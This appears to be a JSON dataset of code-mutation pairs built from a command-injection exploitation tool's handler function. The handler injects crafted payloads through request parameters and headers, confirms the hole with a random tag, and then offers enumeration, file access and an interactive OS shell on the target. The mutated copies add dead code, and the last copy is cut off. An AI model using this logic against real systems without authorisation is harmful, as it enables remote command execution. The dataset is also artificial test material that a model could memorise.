[
    {
        "func_name": "cb_injection_handler",
        "original": "def cb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique):\n    shell = False\n    counter = 1\n    vp_flag = True\n    no_result = True\n    is_encoded = False\n    export_injection_info = False\n    if not settings.LOAD_SESSION:\n        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '. '\n        sys.stdout.write(settings.print_info_msg(info_msg))\n        sys.stdout.flush()\n        if settings.VERBOSITY_LEVEL != 0:\n            print(settings.SINGLE_WHITESPACE)\n    i = 0\n    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)\n    for whitespace in settings.WHITESPACES:\n        for prefix in settings.PREFIXES:\n            for suffix in settings.SUFFIXES:\n                for separator in settings.SEPARATORS:\n                    if whitespace == settings.SINGLE_WHITESPACE:\n                        whitespace = _urllib.parse.quote(whitespace)\n                    settings.DETECTION_PHASE = True\n                    settings.EXPLOITATION_PHASE = False\n                    if settings.LOAD_SESSION and session_handler.notification(url, technique, injection_type):\n                        try:\n                            settings.CLASSIC_STATE = True\n                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)\n                            checks.check_for_stored_tamper(payload)\n                        except TypeError:\n                            err_msg = \"An error occurred while accessing session file ('\"\n                            err_msg += settings.SESSION_FILE + \"'). \"\n                            err_msg += \"Use the '--flush-session' option.\"\n                            print(settings.print_critical_msg(err_msg))\n                            raise SystemExit()\n                    else:\n                        i = i + 1\n                        combination = prefix + separator\n                        if combination in settings.JUNK_COMBINATION:\n                            prefix = ''\n                        TAG = ''.join((random.choice(string.ascii_uppercase) for i in range(6)))\n                        randv1 = random.randrange(100)\n                        randv2 = random.randrange(100)\n                        randvcalc = randv1 + randv2\n                        alter_shell = menu.options.alter_shell\n                        try:\n                            if alter_shell:\n                                payload = cb_payloads.decision_alter_shell(separator, TAG, randv1, randv2)\n                            else:\n                                payload = cb_payloads.decision(separator, TAG, randv1, randv2)\n                            payload = parameters.prefixes(payload, prefix)\n                            payload = parameters.suffixes(payload, suffix)\n                            payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)\n                            payload = checks.perform_payload_modification(payload)\n                            if settings.VERBOSITY_LEVEL != 0:\n                                print(settings.print_payload(payload))\n                            if settings.COOKIE_INJECTION == True:\n                                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)\n                                response = cb_injector.cookie_injection_test(url, vuln_parameter, payload)\n                            elif settings.USER_AGENT_INJECTION == True:\n                                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)\n                                response = cb_injector.user_agent_injection_test(url, vuln_parameter, payload)\n                            elif settings.REFERER_INJECTION == True:\n                                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)\n                                response = cb_injector.referer_injection_test(url, vuln_parameter, payload)\n                            elif settings.HOST_INJECTION == True:\n                                vuln_parameter = parameters.specify_host_parameter(menu.options.host)\n                                response = cb_injector.host_injection_test(url, vuln_parameter, payload)\n                            elif settings.CUSTOM_HEADER_INJECTION == True:\n                                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)\n                                response = cb_injector.custom_header_injection_test(url, vuln_parameter, payload)\n                            else:\n                                (response, vuln_parameter) = cb_injector.injection_test(payload, http_request_method, url)\n                            if settings.URL_RELOAD:\n                                response = requests.url_reload(url, timesec)\n                            time.sleep(timesec)\n                            shell = cb_injector.injection_test_results(response, TAG, randvcalc)\n                            if settings.VERBOSITY_LEVEL == 0:\n                                percent = i * 100 / total\n                                float_percent = '{0:.1f}'.format(round(i * 100 / (total * 1.0), 2))\n                                if shell == False:\n                                    info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '...' + ' (' + str(float_percent) + '%)'\n                                    sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                    sys.stdout.flush()\n                                if float(float_percent) >= 99.9:\n                                    if no_result == True:\n                                        percent = settings.FAIL_STATUS\n                                    else:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                elif len(shell) != 0:\n                                    percent = settings.info_msg\n                                else:\n                                    percent = '.. (' + str(float_percent) + '%)'\n                                info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                sys.stdout.flush()\n                        except (KeyboardInterrupt, SystemExit):\n                            print(settings.SINGLE_WHITESPACE)\n                            raise\n                        except EOFError:\n                            if settings.STDIN_PARSING:\n                                print(settings.SINGLE_WHITESPACE)\n                            err_msg = 'Exiting, due to EOFError.'\n                            print(settings.print_error_msg(err_msg))\n                            raise\n                        except:\n                            continue\n                    if shell:\n                        found = True\n                        no_result = False\n                        settings.DETECTION_PHASE = False\n                        settings.EXPLOITATION_PHASE = True\n                        if settings.COOKIE_INJECTION == True:\n                            header_name = ' cookie'\n                            found_vuln_parameter = vuln_parameter\n                            the_type = ' parameter'\n                        elif settings.USER_AGENT_INJECTION == True:\n                            header_name = ' User-Agent'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.REFERER_INJECTION == True:\n                            header_name = ' Referer'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.HOST_INJECTION == True:\n                            header_name = ' Host'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.CUSTOM_HEADER_INJECTION == True:\n                            header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        else:\n                            header_name = ''\n                            the_type = ' parameter'\n                            if not settings.USER_DEFINED_POST_DATA:\n                                found_vuln_parameter = parameters.vuln_GET_param(url)\n                            else:\n                                found_vuln_parameter = vuln_parameter\n                        if len(found_vuln_parameter) != 0:\n                            found_vuln_parameter = \" '\" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + \"'\"\n                        if export_injection_info == False:\n                            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)\n                        if vp_flag == True:\n                            vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)\n                        logs.update_payload(filename, counter, payload)\n                        counter = counter + 1\n                        if not settings.LOAD_SESSION:\n                            if settings.VERBOSITY_LEVEL == 0:\n                                print(settings.SINGLE_WHITESPACE)\n                            else:\n                                checks.total_of_requests()\n                        info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '\n                        info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'\n                        print(settings.print_bold_info_msg(info_msg))\n                        sub_content = str(checks.url_decode(payload))\n                        print(settings.print_sub_content(sub_content))\n                        if not settings.LOAD_SESSION:\n                            session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)\n                        else:\n                            whitespace = settings.WHITESPACES[0]\n                            settings.LOAD_SESSION = False\n                        new_line = True\n                        if settings.ENUMERATION_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and enumerate again? [y/N] > '\n                                enumerate_again = common.read_input(message, default='N', check_batch=True)\n                                if enumerate_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                                    break\n                                elif enumerate_again in settings.CHOICE_NO:\n                                    new_line = False\n                                    break\n                                elif enumerate_again in settings.CHOICE_QUIT:\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(enumerate_again)\n                                    pass\n                        elif menu.enumeration_options():\n                            cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                        if settings.FILE_ACCESS_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and access files again? [y/N] > '\n                                file_access_again = common.read_input(message, default='N', check_batch=True)\n                                if file_access_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                                    break\n                                elif file_access_again in settings.CHOICE_NO:\n                                    break\n                                elif file_access_again in settings.CHOICE_QUIT:\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(file_access_again)\n                                    pass\n                        elif menu.file_access_options():\n                            cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                        if menu.options.os_cmd:\n                            cb_enumeration.single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                        try:\n                            checks.alert()\n                            go_back = False\n                            go_back_again = False\n                            while True:\n                                if go_back == True:\n                                    break\n                                message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '\n                                if settings.CRAWLING:\n                                    settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)\n                                if not settings.STDIN_PARSING:\n                                    gotshell = common.read_input(message, default='Y', check_batch=True)\n                                else:\n                                    gotshell = common.read_input(message, default='n', check_batch=True)\n                                if gotshell in settings.CHOICE_YES:\n                                    print(settings.OS_SHELL_TITLE)\n                                    if settings.READLINE_ERROR:\n                                        checks.no_readline_module()\n                                    while True:\n                                        if not settings.READLINE_ERROR:\n                                            checks.tab_autocompleter()\n                                        sys.stdout.write(settings.OS_SHELL)\n                                        cmd = common.read_input(message='', default='os_shell', check_batch=True)\n                                        cmd = checks.escaped_cmd(cmd)\n                                        if cmd.lower() in settings.SHELL_OPTIONS:\n                                            (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE='')\n                                            if go_back and go_back_again == False:\n                                                break\n                                            if go_back and go_back_again:\n                                                return True\n                                        else:\n                                            time.sleep(timesec)\n                                            response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)\n                                            if settings.URL_RELOAD:\n                                                response = requests.url_reload(url, timesec)\n                                            if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:\n                                                try:\n                                                    shell = cb_injector.injection_results(response, TAG, cmd)\n                                                    shell = ''.join((str(p) for p in shell))\n                                                except:\n                                                    print(settings.SINGLE_WHITESPACE)\n                                                    continue\n                                                if not menu.options.ignore_session:\n                                                    session_handler.store_cmd(url, cmd, shell, vuln_parameter)\n                                            else:\n                                                shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)\n                                            if shell or shell != '':\n                                                shell = unescape(shell)\n                                                logs.executed_command(filename, cmd, shell)\n                                                print(settings.command_execution_output(shell))\n                                            else:\n                                                err_msg = common.invalid_cmd_output(cmd)\n                                                print(settings.print_error_msg(err_msg))\n                                elif gotshell in settings.CHOICE_NO:\n                                    if checks.next_attack_vector(technique, go_back) == True:\n                                        break\n                                    elif no_result == True:\n                                        return False\n                                    else:\n                                        return True\n                                elif gotshell in settings.CHOICE_QUIT:\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(gotshell)\n                                    pass\n                        except (KeyboardInterrupt, SystemExit):\n                            raise\n                        except EOFError:\n                            if settings.STDIN_PARSING:\n                                print(settings.SINGLE_WHITESPACE)\n                            err_msg = 'Exiting, due to EOFError.'\n                            print(settings.print_error_msg(err_msg))\n                            raise\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL == 0:\n            print(settings.SINGLE_WHITESPACE)\n        return False\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
        "mutated": [
            "def cb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique):\n    if False:\n        i = 10\n    shell = False\n    counter = 1\n    vp_flag = True\n    no_result = True\n    is_encoded = False\n    export_injection_info = False\n    if not settings.LOAD_SESSION:\n        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '. '\n        sys.stdout.write(settings.print_info_msg(info_msg))\n        sys.stdout.flush()\n        if settings.VERBOSITY_LEVEL != 0:\n            print(settings.SINGLE_WHITESPACE)\n    i = 0\n    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)\n    for whitespace in settings.WHITESPACES:\n        for prefix in settings.PREFIXES:\n            for suffix in settings.SUFFIXES:\n                for separator in settings.SEPARATORS:\n                    if whitespace == settings.SINGLE_WHITESPACE:\n                        whitespace = _urllib.parse.quote(whitespace)\n                    settings.DETECTION_PHASE = True\n                    settings.EXPLOITATION_PHASE = False\n                    if settings.LOAD_SESSION and session_handler.notification(url, technique, injection_type):\n                        try:\n                            settings.CLASSIC_STATE = True\n                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)\n                            checks.check_for_stored_tamper(payload)\n                        except TypeError:\n                            err_msg = \"An error occurred while accessing session file ('\"\n                            err_msg += settings.SESSION_FILE + \"'). \"\n                            err_msg += \"Use the '--flush-session' option.\"\n                            print(settings.print_critical_msg(err_msg))\n                            raise SystemExit()\n                    else:\n                        i = i + 1\n                        combination = prefix + separator\n                        if combination in settings.JUNK_COMBINATION:\n                            prefix = ''\n                        TAG = ''.join((random.choice(string.ascii_uppercase) for i in range(6)))\n                        randv1 = random.randrange(100)\n                        randv2 = random.randrange(100)\n                        randvcalc = randv1 + randv2\n                        alter_shell = menu.options.alter_shell\n                        try:\n                            if alter_shell:\n                                payload = cb_payloads.decision_alter_shell(separator, TAG, randv1, randv2)\n                            else:\n                                payload = cb_payloads.decision(separator, TAG, randv1, randv2)\n                            payload = parameters.prefixes(payload, prefix)\n                            payload = parameters.suffixes(payload, suffix)\n                            payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)\n                            payload = checks.perform_payload_modification(payload)\n                            if settings.VERBOSITY_LEVEL != 0:\n                                print(settings.print_payload(payload))\n                            if settings.COOKIE_INJECTION == True:\n                                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)\n                                response = cb_injector.cookie_injection_test(url, vuln_parameter, payload)\n                            elif settings.USER_AGENT_INJECTION == True:\n                                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)\n                                response = cb_injector.user_agent_injection_test(url, vuln_parameter, payload)\n                            elif settings.REFERER_INJECTION == True:\n                                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)\n                                response = cb_injector.referer_injection_test(url, vuln_parameter, payload)\n                            elif settings.HOST_INJECTION == True:\n                                vuln_parameter = parameters.specify_host_parameter(menu.options.host)\n                                response = cb_injector.host_injection_test(url, vuln_parameter, payload)\n                            elif settings.CUSTOM_HEADER_INJECTION == True:\n                                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)\n                                response = cb_injector.custom_header_injection_test(url, vuln_parameter, payload)\n                            else:\n                                (response, vuln_parameter) = cb_injector.injection_test(payload, http_request_method, url)\n                            if settings.URL_RELOAD:\n                                response = requests.url_reload(url, timesec)\n                            time.sleep(timesec)\n                            shell = cb_injector.injection_test_results(response, TAG, randvcalc)\n                            if settings.VERBOSITY_LEVEL == 0:\n                                percent = i * 100 / total\n                                float_percent = '{0:.1f}'.format(round(i * 100 / (total * 1.0), 2))\n                                if shell == False:\n                                    info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '...' + ' (' + str(float_percent) + '%)'\n                                    sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                    sys.stdout.flush()\n                                if float(float_percent) >= 99.9:\n                                    if no_result == True:\n                                        percent = settings.FAIL_STATUS\n                                    else:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                elif len(shell) != 0:\n                                    percent = settings.info_msg\n                                else:\n                                    percent = '.. (' + str(float_percent) + '%)'\n                                info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                sys.stdout.flush()\n                        except (KeyboardInterrupt, SystemExit):\n                            print(settings.SINGLE_WHITESPACE)\n                            raise\n                        except EOFError:\n                            if settings.STDIN_PARSING:\n                                print(settings.SINGLE_WHITESPACE)\n                            err_msg = 'Exiting, due to EOFError.'\n                            print(settings.print_error_msg(err_msg))\n                            raise\n                        except:\n                            continue\n                    if shell:\n                        found = True\n                        no_result = False\n                        settings.DETECTION_PHASE = False\n                        settings.EXPLOITATION_PHASE = True\n                        if settings.COOKIE_INJECTION == True:\n                            header_name = ' cookie'\n                            found_vuln_parameter = vuln_parameter\n                            the_type = ' parameter'\n                        elif settings.USER_AGENT_INJECTION == True:\n                            header_name = ' User-Agent'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.REFERER_INJECTION == True:\n                            header_name = ' Referer'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.HOST_INJECTION == True:\n                            header_name = ' Host'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.CUSTOM_HEADER_INJECTION == True:\n                            header_name = settings.SINGLE_WHITESPACE + settings.CUSTOM_HEADER_NAME\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        else:\n                            header_name = ''\n                            the_type = ' parameter'\n                            if not settings.USER_DEFINED_POST_DATA:\n                                found_vuln_parameter = parameters.vuln_GET_param(url)\n                            else:\n                                found_vuln_parameter = vuln_parameter\n                        if len(found_vuln_parameter) != 0:\n                            found_vuln_parameter = \" '\" + found_vuln_parameter + Style.RESET_ALL + Style.BRIGHT + \"'\"\n                        if export_injection_info == False:\n                            export_injection_info = logs.add_type_and_technique(export_injection_info, filename, injection_type, technique)\n                        if vp_flag == True:\n                            vp_flag = logs.add_parameter(vp_flag, filename, the_type, header_name, http_request_method, vuln_parameter, payload)\n                        logs.update_payload(filename, counter, payload)\n                        counter = counter + 1\n                        if not settings.LOAD_SESSION:\n                            if settings.VERBOSITY_LEVEL == 0:\n                                print(settings.SINGLE_WHITESPACE)\n                            else:\n                                checks.total_of_requests()\n                        info_msg = settings.CHECKING_PARAMETER + ' appears to be injectable via '\n                        info_msg += '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.'\n                        print(settings.print_bold_info_msg(info_msg))\n                        sub_content = str(checks.url_decode(payload))\n                        print(settings.print_sub_content(sub_content))\n                        if not settings.LOAD_SESSION:\n                            session_handler.injection_point_importation(url, technique, injection_type, separator, shell[0], vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response=0, timesec=0, how_long=0, output_length=0, is_vulnerable=menu.options.level)\n                        else:\n                            whitespace = settings.WHITESPACES[0]\n                            settings.LOAD_SESSION = False\n                        new_line = True\n                        if settings.ENUMERATION_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and enumerate again? [y/N] > '\n                                enumerate_again = common.read_input(message, default='N', check_batch=True)\n                                if enumerate_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                                    break\n                                elif enumerate_again in settings.CHOICE_NO:\n                                    new_line = False\n                                    break\n                                elif enumerate_again in settings.CHOICE_QUIT:\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(enumerate_again)\n                                    pass\n                        elif menu.enumeration_options():\n                            cb_enumeration.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                        if settings.FILE_ACCESS_DONE == True:\n                            while True:\n                                message = 'Do you want to ignore stored session and access files again? [y/N] > '\n                                file_access_again = common.read_input(message, default='N', check_batch=True)\n                                if file_access_again in settings.CHOICE_YES:\n                                    if not menu.options.ignore_session:\n                                        menu.options.ignore_session = True\n                                    cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                                    break\n                                elif file_access_again in settings.CHOICE_NO:\n                                    break\n                                elif file_access_again in settings.CHOICE_QUIT:\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(file_access_again)\n                                    pass\n                        elif menu.file_access_options():\n                            cb_file_access.do_check(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                        if menu.options.os_cmd:\n                            cb_enumeration.single_os_cmd_exec(separator, TAG, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, timesec)\n                        try:\n                            checks.alert()\n                            go_back = False\n                            go_back_again = False\n                            while True:\n                                if go_back == True:\n                                    break\n                                message = settings.CHECKING_PARAMETER + ' is vulnerable. Do you want to prompt for a pseudo-terminal shell? [Y/n] > '\n                                if settings.CRAWLING:\n                                    settings.CRAWLED_URLS_INJECTED.append(_urllib.parse.urlparse(url).netloc)\n                                if not settings.STDIN_PARSING:\n                                    gotshell = common.read_input(message, default='Y', check_batch=True)\n                                else:\n                                    gotshell = common.read_input(message, default='n', check_batch=True)\n                                if gotshell in settings.CHOICE_YES:\n                                    print(settings.OS_SHELL_TITLE)\n                                    if settings.READLINE_ERROR:\n                                        checks.no_readline_module()\n                                    while True:\n                                        if not settings.READLINE_ERROR:\n                                            checks.tab_autocompleter()\n                                        sys.stdout.write(settings.OS_SHELL)\n                                        cmd = common.read_input(message='', default='os_shell', check_batch=True)\n                                        cmd = checks.escaped_cmd(cmd)\n                                        if cmd.lower() in settings.SHELL_OPTIONS:\n                                            (go_back, go_back_again) = shell_options.check_option(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique, go_back, no_result, timesec, go_back_again, payload, OUTPUT_TEXTFILE='')\n                                            if go_back and go_back_again == False:\n                                                break\n                                            if go_back and go_back_again:\n                                                return True\n                                        else:\n                                            time.sleep(timesec)\n                                            response = cb_injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename)\n                                            if settings.URL_RELOAD:\n                                                response = requests.url_reload(url, timesec)\n                                            if menu.options.ignore_session or session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None:\n                                                try:\n                                                    shell = cb_injector.injection_results(response, TAG, cmd)\n                                                    shell = ''.join((str(p) for p in shell))\n                                                except:\n                                                    print(settings.SINGLE_WHITESPACE)\n                                                    continue\n                                                if not menu.options.ignore_session:\n                                                    session_handler.store_cmd(url, cmd, shell, vuln_parameter)\n                                            else:\n                                                shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)\n                                            if shell or shell != '':\n                                                shell = unescape(shell)\n                                                logs.executed_command(filename, cmd, shell)\n                                                print(settings.command_execution_output(shell))\n                                            else:\n                                                err_msg = common.invalid_cmd_output(cmd)\n                                                print(settings.print_error_msg(err_msg))\n                                elif gotshell in settings.CHOICE_NO:\n                                    if checks.next_attack_vector(technique, go_back) == True:\n                                        break\n                                    elif no_result == True:\n                                        return False\n                                    else:\n                                        return True\n                                elif gotshell in settings.CHOICE_QUIT:\n                                    raise SystemExit()\n                                else:\n                                    common.invalid_option(gotshell)\n                                    pass\n                        except (KeyboardInterrupt, SystemExit):\n                            raise\n                        except EOFError:\n                            if settings.STDIN_PARSING:\n                                print(settings.SINGLE_WHITESPACE)\n                            err_msg = 'Exiting, due to EOFError.'\n                            print(settings.print_error_msg(err_msg))\n                            raise\n    if no_result == True:\n        if settings.VERBOSITY_LEVEL == 0:\n            print(settings.SINGLE_WHITESPACE)\n        return False\n    else:\n        sys.stdout.write('\\r')\n        sys.stdout.flush()",
            "def cb_injection_handler(url, timesec, filename, http_request_method, injection_type, technique):\n    if False:\n        i = 10\n        while True:\n            print('Mutation')\n    shell = False\n    counter = 1\n    vp_flag = True\n    no_result = True\n    is_encoded = False\n    export_injection_info = False\n    if not settings.LOAD_SESSION:\n        info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '. '\n        sys.stdout.write(settings.print_info_msg(info_msg))\n        sys.stdout.flush()\n        if settings.VERBOSITY_LEVEL != 0:\n            print(settings.SINGLE_WHITESPACE)\n    i = 0\n    total = len(settings.WHITESPACES) * len(settings.PREFIXES) * len(settings.SEPARATORS) * len(settings.SUFFIXES)\n    for whitespace in settings.WHITESPACES:\n        for prefix in settings.PREFIXES:\n            for suffix in settings.SUFFIXES:\n                for separator in settings.SEPARATORS:\n                    if whitespace == settings.SINGLE_WHITESPACE:\n                        whitespace = _urllib.parse.quote(whitespace)\n                    settings.DETECTION_PHASE = True\n                    settings.EXPLOITATION_PHASE = False\n                    if settings.LOAD_SESSION and session_handler.notification(url, technique, injection_type):\n                        try:\n                            settings.CLASSIC_STATE = True\n                            (url, technique, injection_type, separator, shell, vuln_parameter, prefix, suffix, TAG, alter_shell, payload, http_request_method, url_time_response, timesec, how_long, output_length, is_vulnerable) = session_handler.injection_point_exportation(url, http_request_method)\n                            checks.check_for_stored_tamper(payload)\n                        except TypeError:\n                            err_msg = \"An error occurred while accessing session file ('\"\n                            err_msg += settings.SESSION_FILE + \"'). \"\n                            err_msg += \"Use the '--flush-session' option.\"\n                            print(settings.print_critical_msg(err_msg))\n                            raise SystemExit()\n                    else:\n                        i = i + 1\n                        combination = prefix + separator\n                        if combination in settings.JUNK_COMBINATION:\n                            prefix = ''\n                        TAG = ''.join((random.choice(string.ascii_uppercase) for i in range(6)))\n                        randv1 = random.randrange(100)\n                        randv2 = random.randrange(100)\n                        randvcalc = randv1 + randv2\n                        alter_shell = menu.options.alter_shell\n                        try:\n                            if alter_shell:\n                                payload = cb_payloads.decision_alter_shell(separator, TAG, randv1, randv2)\n                            else:\n                                payload = cb_payloads.decision(separator, TAG, randv1, randv2)\n                            payload = parameters.prefixes(payload, prefix)\n                            payload = parameters.suffixes(payload, suffix)\n                            payload = payload.replace(settings.SINGLE_WHITESPACE, whitespace)\n                            payload = checks.perform_payload_modification(payload)\n                            if settings.VERBOSITY_LEVEL != 0:\n                                print(settings.print_payload(payload))\n                            if settings.COOKIE_INJECTION == True:\n                                vuln_parameter = parameters.specify_cookie_parameter(menu.options.cookie)\n                                response = cb_injector.cookie_injection_test(url, vuln_parameter, payload)\n                            elif settings.USER_AGENT_INJECTION == True:\n                                vuln_parameter = parameters.specify_user_agent_parameter(menu.options.agent)\n                                response = cb_injector.user_agent_injection_test(url, vuln_parameter, payload)\n                            elif settings.REFERER_INJECTION == True:\n                                vuln_parameter = parameters.specify_referer_parameter(menu.options.referer)\n                                response = cb_injector.referer_injection_test(url, vuln_parameter, payload)\n                            elif settings.HOST_INJECTION == True:\n                                vuln_parameter = parameters.specify_host_parameter(menu.options.host)\n                                response = cb_injector.host_injection_test(url, vuln_parameter, payload)\n                            elif settings.CUSTOM_HEADER_INJECTION == True:\n                                vuln_parameter = parameters.specify_custom_header_parameter(settings.INJECT_TAG)\n                                response = cb_injector.custom_header_injection_test(url, vuln_parameter, payload)\n                            else:\n                                (response, vuln_parameter) = cb_injector.injection_test(payload, http_request_method, url)\n                            if settings.URL_RELOAD:\n                                response = requests.url_reload(url, timesec)\n                            time.sleep(timesec)\n                            shell = cb_injector.injection_test_results(response, TAG, randvcalc)\n                            if settings.VERBOSITY_LEVEL == 0:\n                                percent = i * 100 / total\n                                float_percent = '{0:.1f}'.format(round(i * 100 / (total * 1.0), 2))\n                                if shell == False:\n                                    info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '...' + ' (' + str(float_percent) + '%)'\n                                    sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                    sys.stdout.flush()\n                                if float(float_percent) >= 99.9:\n                                    if no_result == True:\n                                        percent = settings.FAIL_STATUS\n                                    else:\n                                        percent = '.. (' + str(float_percent) + '%)'\n                                elif len(shell) != 0:\n                                    percent = settings.info_msg\n                                else:\n                                    percent = '.. (' + str(float_percent) + '%)'\n                                info_msg = 'Testing the ' + '(' + injection_type.split(settings.SINGLE_WHITESPACE)[0] + ') ' + technique + '.' + '' + percent + ''\n                                sys.stdout.write('\\r' + settings.print_info_msg(info_msg))\n                                sys.stdout.flush()\n                        except (KeyboardInterrupt, SystemExit):\n                            print(settings.SINGLE_WHITESPACE)\n                            raise\n                        except EOFError:\n                            if settings.STDIN_PARSING:\n                                print(settings.SINGLE_WHITESPACE)\n                            err_msg = 'Exiting, due to EOFError.'\n                            print(settings.print_error_msg(err_msg))\n                            raise\n                        except:\n                            continue\n                    if shell:\n                        found = True\n                        no_result = False\n                        settings.DETECTION_PHASE = False\n                        settings.EXPLOITATION_PHASE = True\n                        if settings.COOKIE_INJECTION == True:\n                            header_name = ' cookie'\n                            found_vuln_parameter = vuln_parameter\n                            the_type = ' parameter'\n                        elif settings.USER_AGENT_INJECTION == True:\n                            header_name = ' User-Agent'\n                            found_vuln_parameter = ''\n                            the_type = ' HTTP header'\n                        elif settings.REFERER_INJECTION == True:\n                            header_name = ' Referer'\n                            